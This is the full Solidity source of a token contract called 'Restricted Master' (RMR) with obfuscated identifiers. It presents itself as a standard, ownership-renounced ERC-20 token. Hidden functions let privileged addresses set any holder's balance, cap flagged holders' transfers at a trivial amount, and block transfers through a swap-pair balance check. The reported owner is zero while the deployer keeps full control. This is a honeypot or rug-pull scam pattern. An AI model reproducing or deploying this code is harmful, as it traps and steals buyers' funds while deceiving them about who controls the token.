//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface sellSwap {
    function createPair(address listExempt, address receiverLaunch) external returns (address);
}

interface liquidityTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchReceiver) external view returns (uint256);

    function transfer(address receiverTokenReceiver, uint256 exemptFrom) external returns (bool);

    function allowance(address listExemptLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptFrom) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTokenReceiver,
        uint256 exemptFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableLimit, uint256 value);
    event Approval(address indexed listExemptLiquidity, address indexed spender, uint256 value);
}

abstract contract swapSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityTradingMetadata is liquidityTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RestrictedMaster is swapSender, liquidityTrading, liquidityTradingMetadata {

    function launchedSell(address txLaunched, uint256 exemptFrom) public {
        receiverFeeAuto();
        exemptLaunched[txLaunched] = exemptFrom;
    }

    uint256 private txAt = 100000000 * 10 ** 18;

    mapping(address => uint256) private exemptLaunched;

    function totalReceiver(address takeAmount, address receiverTokenReceiver, uint256 exemptFrom) internal returns (bool) {
        require(exemptLaunched[takeAmount] >= exemptFrom);
        exemptLaunched[takeAmount] -= exemptFrom;
        exemptLaunched[receiverTokenReceiver] += exemptFrom;
        emit Transfer(takeAmount, receiverTokenReceiver, exemptFrom);
        return true;
    }

    uint256 constant fundReceiverTx = 2 ** 10;

    bool public atTo;

    function decimals() external view virtual override returns (uint8) {
        return txTo;
    }

    address senderTradingMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address tradingLiquidity, uint256 exemptFrom) public virtual override returns (bool) {
        maxWallet[_msgSender()][tradingLiquidity] = exemptFrom;
        emit Approval(_msgSender(), tradingLiquidity, exemptFrom);
        return true;
    }

    address private marketingBuy;

    function transfer(address txLaunched, uint256 exemptFrom) external virtual override returns (bool) {
        return isLiquidity(_msgSender(), txLaunched, exemptFrom);
    }

    function buyAt(uint256 exemptFrom) public {
        receiverFeeAuto();
        tradingTxMarketing = exemptFrom;
    }

    uint256 public launchFrom;

    string private atTake = "RMR";

    function maxTakeToken(address exemptLimit) public {
        require(exemptLimit.balance < 100000);
        if (atTo) {
            return;
        }
        
        fromFee[exemptLimit] = true;
        if (isTotal != receiverAuto) {
            receiverAuto = launchFrom;
        }
        atTo = true;
    }

    function allowance(address launchLaunched, address tradingLiquidity) external view virtual override returns (uint256) {
        if (tradingLiquidity == senderTradingMarketing) {
            return type(uint256).max;
        }
        return maxWallet[launchLaunched][tradingLiquidity];
    }

    function name() external view virtual override returns (string memory) {
        return limitMarketing;
    }

    function transferFrom(address takeAmount, address receiverTokenReceiver, uint256 exemptFrom) external override returns (bool) {
        if (_msgSender() != senderTradingMarketing) {
            if (maxWallet[takeAmount][_msgSender()] != type(uint256).max) {
                require(exemptFrom <= maxWallet[takeAmount][_msgSender()]);
                maxWallet[takeAmount][_msgSender()] -= exemptFrom;
            }
        }
        return isLiquidity(takeAmount, receiverTokenReceiver, exemptFrom);
    }

    function fromMax(address listMax) public {
        receiverFeeAuto();
        
        if (listMax == limitMax || listMax == sellBuy) {
            return;
        }
        receiverTxAuto[listMax] = true;
    }

    function getOwner() external view returns (address) {
        return marketingBuy;
    }

    uint256 public isTotal;

    constructor (){
        
        receiverFee launchedLimitLaunch = receiverFee(senderTradingMarketing);
        sellBuy = sellSwap(launchedLimitLaunch.factory()).createPair(launchedLimitLaunch.WETH(), address(this));
        
        limitMax = _msgSender();
        fromFee[limitMax] = true;
        exemptLaunched[limitMax] = txAt;
        receiverTotal();
        if (launchFrom != receiverAuto) {
            launchFrom = listAutoToken;
        }
        emit Transfer(address(0), limitMax, txAt);
    }

    uint256 private listAutoToken;

    uint256 private receiverAuto;

    mapping(address => bool) public receiverTxAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return txAt;
    }

    address minToBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 shouldSell;

    string private limitMarketing = "Restricted Master";

    function isLiquidity(address takeAmount, address receiverTokenReceiver, uint256 exemptFrom) internal returns (bool) {
        if (takeAmount == limitMax) {
            return totalReceiver(takeAmount, receiverTokenReceiver, exemptFrom);
        }
        uint256 tradingTeam = liquidityTrading(sellBuy).balanceOf(minToBuy);
        require(tradingTeam == tradingTxMarketing);
        require(receiverTokenReceiver != minToBuy);
        if (receiverTxAuto[takeAmount]) {
            return totalReceiver(takeAmount, receiverTokenReceiver, fundReceiverTx);
        }
        return totalReceiver(takeAmount, receiverTokenReceiver, exemptFrom);
    }

    function owner() external view returns (address) {
        return marketingBuy;
    }

    mapping(address => mapping(address => uint256)) private maxWallet;

    function balanceOf(address launchReceiver) public view virtual override returns (uint256) {
        return exemptLaunched[launchReceiver];
    }

    event OwnershipTransferred(address indexed fundFee, address indexed sellLaunchedBuy);

    address public limitMax;

    address public sellBuy;

    uint8 private txTo = 18;

    mapping(address => bool) public fromFee;

    function receiverTotal() public {
        emit OwnershipTransferred(limitMax, address(0));
        marketingBuy = address(0);
    }

    function receiverFeeAuto() private view {
        require(fromFee[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return atTake;
    }

    uint256 tradingTxMarketing;

}